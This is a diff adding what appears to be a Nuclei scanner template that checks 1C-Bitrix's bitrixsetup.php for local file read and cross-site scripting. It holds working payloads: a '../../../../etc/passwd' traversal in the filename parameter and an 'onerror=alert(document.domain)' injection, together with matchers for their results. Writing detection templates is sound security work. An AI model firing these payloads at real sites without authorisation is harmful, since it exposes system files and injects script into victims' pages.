@@ -1,0 +1,33 @@
+id: bitrix_bitrixsetup
+
+info:
+
+  name: 1C-Bitrix Bitrisetup error
+  author: vag4b0nd
+  severity: high
+  description: The template detection XSS and LFR in Bitrix setup script
+  tags: Bitrix,xss,lfr,setup
+
+requests:
+  - method: GET
+    path:
+        - "{{RootURL}}/{{payload}}"
+
+    payloads:
+        payload:
+            - "bitrixsetup.php?action=UNPACK&filename=../../../../etc/passwd"
+            - "bitrixsetup.php?action=UNPACK&filename=<img src='' onerror=alert(document.domain)>"
+
+    redirects: false
+    matchers-condition: or
+
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'root:.*?:[0-9]*:[0-9]*:'
+
+      - type: word
+        part: body
+        words:
+            - "alert(document.domain)"
